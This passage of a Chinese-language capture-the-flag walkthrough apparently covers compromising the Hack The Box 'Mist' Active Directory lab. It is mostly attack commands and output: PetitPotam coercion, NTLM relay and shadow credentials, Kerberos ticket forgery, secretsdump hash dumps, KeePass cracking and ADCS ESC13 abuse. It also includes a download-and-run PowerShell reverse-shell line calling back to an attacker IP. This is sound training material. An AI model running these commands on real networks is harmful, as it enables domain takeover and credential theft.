<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 Responder.py -i 10.10.16.13 -v</span><br><span class="line"></span><br><span class="line">meterpreter &gt; upload socat.zip</span><br><span class="line">Expand-Archive -Path C:\xampp\htdocs\files\socat.zip -DestinationPath C:\xampp\htdocs\files\</span><br><span class="line"></span><br><span class="line">.\socat.exe tcp-listen:2525,reuseaddr,fork tcp:10.10.16.13:80</span><br><span class="line"></span><br><span class="line">proxychains4 ~/Tools/impacket/bin/python3 PetitPotam.py -u "brandon.keywarp" -d mist.htb -hashes ":db03d6a77a2205bc1d07082740626cc9" "ms01@2525/miaomiaomiao" 192.168.100.101 -pipe all</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 每次运行PetitPotam之前先运行一次enableWebdev</span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040112.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>能够触发强制访问</p>
<h2 id="relay-amp-shadow-creds"><a href="#relay-amp-shadow-creds" class="headerlink" title="relay &amp; shadow creds"></a>relay &amp; shadow creds</h2><p>接下来就是通过relay获取ldap shell，清除shadow creds,然后添加新的：</p>
<ul>
<li>Add Shadow Credentials Commands to Ntlmrelayx’s Interactive LDAP Shell by Tw1sm · Pull Request #1402 · fortra/impacket<br><a href="https://github.com/fortra/impacket/pull/1402" target="_blank" rel="noopener">https://github.com/fortra/impacket/pull/1402</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains4 ./bin/python3 examples/ntlmrelayx.py -t ldap://dc01.mist.htb -i</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> clear_shadow_creds MS01$</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> set_shadow_creds MS01$</span></span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040113.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040114.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040115.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="enableWebdev-ps1"><a href="#enableWebdev-ps1" class="headerlink" title="enableWebdev.ps1"></a>enableWebdev.ps1</h2><ul>
<li>How to start a “Trigger Start” windows service with Powershell without elevation / admin rights | Liebensraum<br><a href="https://www.lieben.nu/liebensraum/2016/10/how-to-start-a-trigger-start-windows-service-with-powershell-without-elevation-admin-rights/" target="_blank" rel="noopener">https://www.lieben.nu/liebensraum/2016/10/how-to-start-a-trigger-start-windows-service-with-powershell-without-elevation-admin-rights/</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Source</span> = <span class="string">@"</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Text;</span></span><br><span class="line"><span class="string">using System.Security;</span></span><br><span class="line"><span class="string">using System.Collections.Generic;</span></span><br><span class="line"><span class="string">using System.Runtime.Versioning;</span></span><br><span class="line"><span class="string">using Microsoft.Win32.SafeHandles;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">using System.Diagnostics.CodeAnalysis;</span></span><br><span class="line"><span class="string">namespace JosL.WebClient&#123;</span></span><br><span class="line"><span class="string">public static class Starter&#123;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Explicit, Size=16)]</span></span><br><span class="line"><span class="string">public class EVENT_DESCRIPTOR&#123;</span></span><br><span class="line"><span class="string">[FieldOffset(0)]ushort Id = 1;</span></span><br><span class="line"><span class="string">[FieldOffset(2)]byte Version = 0;</span></span><br><span class="line"><span class="string">[FieldOffset(3)]byte Channel = 0;</span></span><br><span class="line"><span class="string">[FieldOffset(4)]byte Level = 4;</span></span><br><span class="line"><span class="string">[FieldOffset(5)]byte Opcode = 0;</span></span><br><span class="line"><span class="string">[FieldOffset(6)]ushort Task = 0;</span></span><br><span class="line"><span class="string">[FieldOffset(8)]long Keyword = 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Explicit, Size = 16)]</span></span><br><span class="line"><span class="string">public struct EventData&#123;</span></span><br><span class="line"><span class="string">[FieldOffset(0)]</span></span><br><span class="line"><span class="string">internal UInt64 DataPointer;</span></span><br><span class="line"><span class="string">[FieldOffset(8)]</span></span><br><span class="line"><span class="string">internal uint Size;</span></span><br><span class="line"><span class="string">[FieldOffset(12)]</span></span><br><span class="line"><span class="string">internal int Reserved;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">public static void startService()&#123;</span></span><br><span class="line"><span class="string">Guid webClientTrigger = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">long handle = 0;</span></span><br><span class="line"><span class="string">uint output = EventRegister(ref webClientTrigger, IntPtr.Zero, IntPtr.Zero, ref handle);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bool success = false;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (output == 0)&#123;</span></span><br><span class="line"><span class="string">EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();</span></span><br><span class="line"><span class="string">unsafe</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">uint writeOutput = EventWrite(handle, ref desc, 0, null);</span></span><br><span class="line"><span class="string">success = writeOutput == 0;</span></span><br><span class="line"><span class="string">EventUnregister(handle);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[DllImport("Advapi32.dll", SetLastError = true)]</span></span><br><span class="line"><span class="string">public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[DllImport("Advapi32.dll", SetLastError = true)]</span></span><br><span class="line"><span class="string">public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[DllImport("Advapi32.dll", SetLastError = true)]</span></span><br><span class="line"><span class="string">public static extern uint EventUnregister(long RegHandle);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"@</span></span><br><span class="line"><span class="variable">$compilerParameters</span> = <span class="built_in">New-Object</span> System.CodeDom.Compiler.CompilerParameters</span><br><span class="line"><span class="variable">$compilerParameters</span>.CompilerOptions=<span class="string">"/unsafe"</span></span><br><span class="line"><span class="built_in">Add-Type</span> -TypeDefinition <span class="variable">$Source</span> -Language CSharp -CompilerParameters <span class="variable">$compilerParameters</span></span><br><span class="line">[JosL.WebClient.Starter]::startService()</span><br></pre></td></tr></table></figure>

<h1 id="Pass-the-Certificate"><a href="#Pass-the-Certificate" class="headerlink" title="Pass the Certificate"></a>Pass the Certificate</h1><p>拿到证书后就还是Pass the Certificate：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 ~/Tools/PKINITtools/gettgtpkinit.py -cert-pfx ./haSz3Dmd.pfx -pfx-pass "TugrKU8sXDVRT9StpNIy" MIST.HTB/MS01$ ms01.ccache -dc-ip 192.168.100.100 -v</span><br><span class="line"></span><br><span class="line">35beedab39d5e8752bfce27e30a406e4c50b852d72b86833b7e095fb9c89854a</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./ms01.ccache</span><br><span class="line"></span><br><span class="line">proxychains4 python3 ~/Tools/PKINITtools/getnthash.py mist.htb/ms01\$ -key 35beedab39d5e8752bfce27e30a406e4c50b852d72b86833b7e095fb9c89854a</span><br><span class="line"></span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line">4a74fc05400345d580cf58aec3e6d833</span><br></pre></td></tr></table></figure>

<p>现在获取了ms01的机器hash后就可以伪造任意用户了：</p>
<p>前面的流程和vullab的Sidecar很像，可以直接参考：</p>
<ul>
<li>VulnLab SideCar Walkthrough. Sidecar, involved two machines WS01 and… | by Manan | Medium<br><a href="https://medium.com/@manan07/vulnlab-sidecar-walkthrough-d59d45fbc8dc" target="_blank" rel="noopener">https://medium.com/@manan07/vulnlab-sidecar-walkthrough-d59d45fbc8dc</a></li>
<li>Vulnlab — Sidecar. Sidecar, a similar AD chained like… | by ARZ101 | Mar, 2024 | Medium<br><a href="https://arz101.medium.com/vulnlab-sidecar-2611d86ba616" target="_blank" rel="noopener">https://arz101.medium.com/vulnlab-sidecar-2611d86ba616</a></li>
<li>SolomonSklash/RubeusToCcache: A small tool to convert Base64-encoded .kirbi tickets from Rubeus into .ccache files for Impacket<br><a href="https://github.com/SolomonSklash/RubeusToCcache" target="_blank" rel="noopener">https://github.com/SolomonSklash/RubeusToCcache</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /nowrap /user:"ms01$" /rc4:4a74fc05400345d580cf58aec3e6d833</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /ticket:doIFLxxxxxx</span><br><span class="line"></span><br><span class="line">python3 rubeustoccache.py &lt;base64_tgs&gt; ms01.kirbi ms01.ccache</span><br><span class="line">export KRB5CCNAME=./ms01.ccache</span><br><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/wmiexec.py Administrator@ms01.mist.htb -k -no-pass -debug</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> S-1-5-21-1045809509-3006658589-2426055941-1108</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 也可以直接用impacket制作本地管理员的票据</span></span><br><span class="line">proxychains4 ./bin/python3 ./examples/ticketer.py -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -spn HOST/MS01.mist.htb -nthash 4a74fc05400345d580cf58aec3e6d833 -user-id 500 Administrator</span><br><span class="line">export KRB5CCNAME=./Administrator.ccache</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040116.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ms01-hashdump"><a href="#ms01-hashdump" class="headerlink" title="ms01 hashdump"></a>ms01 hashdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ~/Tools/impacket/bin/python3 ~/Tools/impacket/examples/secretsdump.py Administrator@ms01.mist.htb -k -no-pass -debug</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xe3a142f26a6e42446aa8a55e39cbcd86</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::</span><br><span class="line">svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::</span><br><span class="line">MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833:::</span><br><span class="line">svc_web:MostSavagePasswordEver123</span><br></pre></td></tr></table></figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>ms01的Administrator桌面</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040117.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="Sharon-Mullard"><a href="#Sharon-Mullard" class="headerlink" title="Sharon.Mullard"></a>Sharon.Mullard</h1><p>Sharon.Mullard用户Documents目录一个kdbx文件，下载下来,Pictures目录两张图也是同样操作：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\users\Sharon.Mullard\Documents&gt;lget sharon.kdbx</span><br><span class="line">C:\users\Sharon.Mullard\Pictures&gt;lget cats.png</span><br><span class="line">C:\users\Sharon.Mullard\Pictures&gt;lget image_20022024.png</span><br></pre></td></tr></table></figure>

<p>image_20022024.png图片上是一半密码和几条todo：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040118.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>合理猜测就是keepass密码，根据已知部分结合字典爆破：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">UA7cpa[#</span><span class="bash">1!_*ZX</span></span><br><span class="line"></span><br><span class="line">keepass2john sharon.kdbx</span><br><span class="line"></span><br><span class="line">sharon:$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 转换为hashcat格式</span></span><br><span class="line">cat hash.txt| grep -o "$keepass$.*" &gt; hash2.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> test.rule</span></span><br><span class="line">^X^Z^*^_^!^1^#^[^a^p^c^7^A^U</span><br><span class="line"><span class="meta">#</span><span class="bash"> words.txt是所有可打印字符</span></span><br><span class="line">hashcat -a 0 -m 13400 -r test.rule hash2.txt words.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 破解出来密码</span></span><br><span class="line"><span class="meta">UA7cpa[#</span><span class="bash">1!_*ZX@</span></span><br></pre></td></tr></table></figure>

<p>然后使用得到的keepass密码打开kdbx，得到operative account密码.并且根据标题可以猜测对应域用户op_Sharon.Mullard：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ImTiredOfThisJob:(</span><br><span class="line"></span><br><span class="line">op_Sharon.Mullard</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040119.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>切换用户：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunasCs.exe op_Sharon.Mullard ImTiredOfThisJob:( -d mist.htb cmd.exe -r 10.10.16.13:4446  --bypass-uac</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040120.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="Winrm"><a href="#Winrm" class="headerlink" title="Winrm"></a>Winrm</h2><p>op_Sharon.Mullard可以winrm登录到dc：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec winrm 192.168.100.100 -u op_Sharon.Mullard -p "ImTiredOfThisJob:(" -X whoami</span><br><span class="line"></span><br><span class="line">proxychains4 netexec winrm 192.168.100.100 -u op_Sharon.Mullard -p "ImTiredOfThisJob:(" -X "IEX ((new-object net.webclient).downloadstring('http://10.10.16.13:7777/Invoke-PowerShellTcp.ps1'))"</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040121.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="gmsa"><a href="#gmsa" class="headerlink" title="gmsa"></a>gmsa</h2><p>根据bloodhound分析，op_Sharon.Mullard可以读svc_ca$的gmsa：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040122.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="svc-ca"><a href="#svc-ca" class="headerlink" title="svc_ca$"></a>svc_ca$</h1><p>通过op_Sharon.Mullard读gmsa得到svc_ca$：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 netexec ldap 192.168.100.100 -u op_Sharon.Mullard -p "ImTiredOfThisJob:(" --gmsa</span><br><span class="line"></span><br><span class="line">LDAP        192.168.100.100 636    DC01             Account: svc_ca$              NTLM: 6db5b4f0e49cf6da4c937944d58c416b</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040123.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="AddKeyCredentialLink"><a href="#AddKeyCredentialLink" class="headerlink" title="AddKeyCredentialLink"></a>AddKeyCredentialLink</h2><p>然后svc_ca$又对svc_cabackup有AddKeyCredentialLink权限：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040124.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="svc-cabackup"><a href="#svc-cabackup" class="headerlink" title="svc_cabackup"></a>svc_cabackup</h1><p>那就是继续影子证书+Pass the Certificate获取svc_cabackup的ntlm hash：</p>
<ul>
<li>ShutdownRepo/pywhisker: Python version of the C# tool for “Shadow Credentials” attacks<br><a href="https://github.com/ShutdownRepo/pywhisker" target="_blank" rel="noopener">https://github.com/ShutdownRepo/pywhisker</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 pywhisker.py -d "mist.htb" --dc-ip 192.168.100.100 -u 'svc_ca$' -H 6db5b4f0e49cf6da4c937944d58c416b --target "svc_cabackup" --action "add"</span><br><span class="line"></span><br><span class="line">proxychains4 python3 ~/Tools/PKINITtools/gettgtpkinit.py -cert-pfx ./g3gHXvGL.pfx -pfx-pass "pRQp8wIwljQzDPjbgfUl" MIST.HTB/svc_cabackup svc_cabackup.ccache -dc-ip 192.168.100.100 -v</span><br><span class="line"></span><br><span class="line">a2db4e1a80dad031169f0ee3703b617aa67eab403975cece0497dc28cff5202f</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./svc_cabackup.ccache</span><br><span class="line"></span><br><span class="line">proxychains4 python3 ~/Tools/PKINITtools/getnthash.py mist.htb/svc_cabackup -key a2db4e1a80dad031169f0ee3703b617aa67eab403975cece0497dc28cff5202f</span><br><span class="line"></span><br><span class="line">Recovered NT Hash</span><br><span class="line">c9872f1bc10bdd522c12fc2ac9041b64</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040125.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h1><h2 id="ESC13"><a href="#ESC13" class="headerlink" title="ESC13"></a>ESC13</h2><p>根据svc_cabackup的组，查看ADCS，这部分是ESC13，还没合到标准分支里：</p>
<ul>
<li>ADCS ESC13 Abuse Technique. It is possible to configure an Active… | by Jonas Bülow Knudsen | Feb, 2024 | Posts By SpecterOps Team Members<br><a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53" target="_blank" rel="noopener">https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53</a></li>
<li>Adds support for ESC13 by sploutchy · Pull Request #196 · ly4k/Certipy<br><a href="https://github.com/ly4k/Certipy/pull/196" target="_blank" rel="noopener">https://github.com/ly4k/Certipy/pull/196</a></li>
<li>Powershell/Check-ADCSESC13.ps1 at master · JonasBK/Powershell<br><a href="https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1" target="_blank" rel="noopener">https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1</a></li>
<li>滥用ADCS进行权限提升——ESC13详解 - 先知社区<br><a href="https://xz.aliyun.com/t/13864" target="_blank" rel="noopener">https://xz.aliyun.com/t/13864</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ./bin/certipy find -vulnerable -u svc_cabackup@mist.htb -hashes :c9872f1bc10bdd522c12fc2ac9041b64  -dc-ip 192.168.100.100 -stdout</span><br><span class="line"></span><br><span class="line">ManagerAuthentication</span><br><span class="line">mist-DC01-CA</span><br><span class="line">    </span><br><span class="line">      ESC13                             : 'MIST.HTB\\Certificate Services' can enroll, template allows client authentication and issuance policy is linked to group ['CN=Certificate Managers,CN=Users,DC=mist,DC=htb']</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2024/master/2024040126.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="esc13-abuse"><a href="#esc13-abuse" class="headerlink" title="esc13 abuse"></a>esc13 abuse</h2><p>直接请求证书会报错，根据报错信息知道是key size问题，要手动指定keysize为4096，默认是2048</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ./bin/certipy req  -u svc_cabackup@mist.htb -hashes :c9872f1bc10bdd522c12fc2ac9041b64  -dc-ip 192.168.100.100 -dns 192.168.100.100 -ca mist-DC01-CA -target DC01.mist.htb -template ManagerAuthentication -key-size 4096 -debug</span><br><span class="line"></span><br><span class="line">[*] Got certificate with UPN 'svc_cabackup@mist.htb'</span><br><span class="line">[*] Certificate object SID is 'S-1-5-21-1045809509-3006658589-2426055941-1135'</span><br><span class="line">[*] Saved certificate and private key to 'svc_cabackup.pfx'</span><br><span class="line"></span><br><span class="line">proxychains4 ./bin/certipy auth -pfx ./svc_cabackup.pfx -dc-ip 192.168.100.100 -kirbi</span><br><span class="line"></span><br><span class="line">python3 ~/Tools/impacket/examples/ticketConverter.py ./svc_cabackup.kirbi ./svc_cabackup.ccache</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./svc_cabackup.ccache</span><br></pre></td></tr></table></figure>

<p>现在得到的拥有Certificate Managers权限</p>
<h2 id="BackupSvcAuthentication"><a href="#BackupSvcAuthentication" class="headerlink" title="BackupSvcAuthentication"></a>BackupSvcAuthentication</h2><p>然后Certificate Managers可以申请BackupSvcAuthentication证书,使用这个证书再获取新的票据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ./bin/certipy req -u 'svc_cabackup@mist.htb' -k -no-pass -dc-ip 192.168.100.100 -dns 192.168.100.100 -ca mist-DC01-CA -target DC01.mist.htb -template 'BackupSvcAuthentication' -ca mist-DC01-CA -key-size 4096 -debug</span><br><span class="line"></span><br><span class="line">proxychains4 ./bin/certipy auth -pfx ./svc_cabackup.pfx -dc-ip 192.168.100.100 -debug</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=./svc_cabackup.ccache</span><br></pre></td></tr></table></figure>

<h2 id="registry"><a href="#registry" class="headerlink" title="registry"></a>registry</h2><p>BackupSvc根据名字就是有备份权限，常规的备份注册表提取hash：</p>
<ul>
<li>SAM &amp; LSA secrets | The Hacker Recipes<br><a href="https://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets" target="_blank" rel="noopener">https://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets</a></li>
</ul>
